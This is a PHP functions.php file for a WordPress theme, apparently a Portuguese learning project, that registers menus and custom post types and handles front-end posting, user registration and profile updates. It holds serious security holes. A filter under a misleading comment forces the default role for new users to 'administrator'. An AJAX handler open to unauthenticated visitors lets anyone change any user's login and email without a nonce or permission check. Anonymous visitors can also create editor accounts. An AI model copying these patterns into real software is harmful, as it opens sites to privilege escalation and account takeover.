<?php

function estudowordpress_setup() {

    /**
     * Esse recurso permite links de feed automáticos para postagens e comentários no cabeçalho. Isso deve ser usado no lugar da função obsoleta automatic_feed_links() .
     */
    add_theme_support('automatic-feed-links');

    /**
     * Esse recurso permite que plug-ins e temas gerenciem a tag de título do documento . Isso deve ser usado no lugar da função wp_title() .
     */
    add_theme_support('title-tag');

    /**
     * Esse recurso permite o suporte de Post Thumbnails para um tema.
     */
    add_theme_support('post-thumbnails');

    /**
     * Esse recurso permite o uso de marcação HTML5 para formulários de pesquisa, formulários de comentários, listas de comentários, galeria e legenda.
     */

    add_theme_support('html5', array(
        'gallery',
        'caption',
    ) );
}
add_action('after_setup_theme', 'estudowordpress_setup');


function the_images($uri){
	echo get_theme_file_uri('assets/images/'.$uri);
}



function registra_menu_navegacao(){
	register_nav_menu('header-menu','Menu Principal');
}
add_action('init','registra_menu_navegacao');


function registra_menu_membros(){
    register_nav_menu('header-menu-membros', 'Menu Página de Membros');
}
add_action('init','registra_menu_membros');


add_action( 'init', 'post_type_estudowordpress');
function post_type_estudowordpress() {
    $labels = array(
        'name'          => 'Cenouras',
        'singular_name' => 'Cenoura' 
    );

    $args = array (
        'labels'    =>  $labels,
        'public'    =>  true,
        'menu_icon' =>  'dashicons-carrot', /** https://developer.wordpress.org/resource/dashicons/#youtube */
        'has_archive'   =>  false,
        'rewrite'   =>  false,
        'supports'  =>  array(
            'title',
            'editor',
            'author',
            'thumbnail'
        ),
    );
    register_post_type('cenoura', $args);
}




add_action('init', 'post_type_bolos');

function post_type_bolos(){
	$labels = array(
		'name'          => 'Bolos',
		'singular_name' => 'Bolo'
	);

	$args = array (
		'labels'    =>  $labels,
		'public'    =>  true,
		'menu_icon' =>  'dashicons-buddicons-community', /** https://developer.wordpress.org/resource/dashicons/#youtube */
		'has_archive'   =>  false,
		'rewrite'   =>  false,
		'supports'  =>  array(
			'title',
			'editor',
			'author',
			'thumbnail'
		),
	);
	register_post_type('bolo', $args);
}



function novo_post() {
	if ($_POST['action'] == 'nova_postagem'){
		$title = $_POST['titulo'];
		$content = $_POST['conteudo'];
	}
	$new_post = array(
		'post_type'     => 'bolo',
		'post_title'    => $title,
		'post_content'  => $content,
		'post_author'   => get_current_user_id(),
		'post_status'   => 'publish'
	);
	$post_id=wp_insert_post($new_post);
	if (is_wp_error($post_id)){
		echo $post_id->get_error_message();
		die();
	}else{
		header('Location:'. get_home_url().'/contato/?success');
		die();
	}

}
add_action('admin_post_nova_postagem','novo_post');


function my_login_redirect( $redirect_to, $request, $user ) {

	if ( isset( $user->roles ) && is_array( $user->roles ) ) {
		//check for admins
		if ( in_array( 'administrator', $user->roles ) ) {
			// redirect them to the default place
			return get_home_url(). '/wp-admin';
		} else {
			return $redirect_to;
		}
	} else {
		return get_home_url(). '/pagina-membros';
	}
}

add_filter( 'login_redirect', 'my_login_redirect', 10, 3 );


function remove_admin_bar() {
	if (!current_user_can('administrator') && !is_admin()) {
		show_admin_bar(false);
	}
}
add_action('after_setup_theme', 'remove_admin_bar');






// ::::::::::: ESCONDER ALGUMAS INFORMAÇÕES NA USER.PHP DO ADMIN ::::::::::::: //

add_filter('pre_option_default_role', function($default_role){
	return 'administrator';
	return $default_role; //
});

if( is_admin() ){
	remove_action( 'admin_color_scheme_picker', 'admin_color_scheme_picker' );
	add_action( 'personal_options', 'prefix_hide_personal_options' );
}

function prefix_hide_personal_options() {
	?>
	<script type="text/javascript">
        jQuery( document ).ready(function( $ ){
            $( '#your-profile .form-table:first, #your-profile h3:first, .yoast, .user-description-wrap, .user-profile-picture, h2, .user-pinterest-wrap, .user-myspace-wrap, .user-soundcloud-wrap, .user-tumblr-wrap, .user-wikipedia-wrap' ).remove();
        } );
	</script>
	<?php
}


add_action('admin_post_novo_usuario', 'novo_usuario');
add_action('admin_post_nopriv_novo_usuario', 'novo_usuario');

function novo_usuario() {
	if ( isset( $_POST['nome'] ) && isset( $_POST['sobrenome'] ) && isset( $_POST['usuario'] ) && isset( $_POST['email'] ) && isset( $_POST['senha'] ) ) {

        $nome = $_POST['nome'];
        $sobrenome = $_POST['sobrenome'];
		$usuario = sanitize_user( $_POST['usuario'] );
		$email = sanitize_email( $_POST['email'] );
		$senha = $_POST['senha'];

		$dados_usuario = array(
			'user_login'  => $usuario,
			'user_email'  => $email,
			'user_pass'   => $senha,
			'first_name' => $nome,
			'last_name' => $sobrenome,
			'role'        => 'editor', // Defina o papel do novo usuário conforme necessário
            'show_admin_bar_front'  => false
		);

		$user_id = wp_insert_user( $dados_usuario );

		if ( ! is_wp_error( $user_id ) ) {
			echo 'Usuário registrado com sucesso!';
		} else {
			echo 'Erro ao registrar o usuário: ' . $user_id->get_error_message();
		}
	} else {
		echo 'Todos os campos são obrigatórios.';
	}

	// Redirecionar para a página de onde o formulário foi enviado
	wp_redirect( $_SERVER['HTTP_REFERER'] );
	exit;
}




function ultimo_login($login){
	$user = get_user_by('id', $login);
	$curent_login_time = get_user_meta( $user->ID , 'last_login', true);
	$the_login_date = date('d/m/Y H:i:s', strtotime($curent_login_time));

	if(!empty($curent_login_time)){
		update_user_meta( $user->ID, 'last_login', $curent_login_time );
		update_user_meta( $user->ID, 'current_login', current_time('mysql') );
		return $the_login_date;
	}else {
		update_user_meta( $user->ID, 'current_login', current_time('mysql') );
		update_user_meta( $user->ID, 'last_login', current_time('mysql') );
		return $the_login_date;
	}
}

add_action( 'wp_login', 'ultimo_login', 10, 2 );








add_action('wp_ajax_update_user_data', 'update_user_data');
add_action('wp_ajax_nopriv_update_user_data', 'update_user_data');

function update_user_data() {
	$user_id = isset($_POST['user_id']) ? intval($_POST['user_id']) : 0;
	$first_name = isset($_POST['first_name']) ? sanitize_text_field($_POST['first_name']) : '';
	$last_name = isset($_POST['last_name']) ? sanitize_text_field($_POST['last_name']) : '';
	$user_login = isset($_POST['user_login']) ? sanitize_user($_POST['user_login']) : '';
	$user_email = isset($_POST['user_email']) ? sanitize_email($_POST['user_email']) : '';
	$cpf = isset($_POST['cpf']) ? sanitize_text_field($_POST['cpf']) : '';
	$telefone = isset($_POST['telefone']) ? sanitize_text_field($_POST['telefone']) : '';

	// Atualizar os campos padrão do usuário
	$userdata = array(
		'ID'           => $user_id,
		'first_name'   => $first_name,
		'last_name'    => $last_name,
		'user_login'   => $user_login,
		'user_email'   => $user_email,
	);
	wp_update_user($userdata);

	// Atualizar os campos personalizados do ACF
	update_field('cpf', $cpf, 'user_' . $user_id);
	update_field('telefone_pessoal', $telefone, 'user_' . $user_id);

	wp_die(); // Termina a execução do script
}

